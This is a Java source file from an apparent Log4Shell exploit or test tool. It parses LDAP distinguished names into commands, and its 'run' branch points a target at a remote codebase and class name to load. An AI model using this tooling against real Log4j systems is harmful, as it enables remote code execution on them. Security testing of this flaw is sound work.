package log4shell;

import com.unboundid.ldap.sdk.Attribute;
import com.unboundid.ldap.sdk.DN;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.RDN;

public final class CommandParser {
  private final String codebase;

  public CommandParser(String codebase) {
    this.codebase = codebase;
  }

  public Command parse(String command) {
    try {
      DN dn = new DN(command);
      if (dn.isNullDN()) return new NoOpCommand(dn);
      RDN rdn = dn.getRDN();
      Attribute firstAttribute = rdn.getAttributes()[0];
      switch (firstAttribute.getName()) {
        case "run":
          String className = firstAttribute.getValue();
          return new RunCommand(dn, codebase, className);
        case "log":
          String message = firstAttribute.getValue();
          return new LogCommand(dn, message);
        default:
          return new LogCommand(dn, dn.toString());
      }
    } catch (LDAPException e) {
      return new LogCommand(new DN(), command);
    }
  }
}
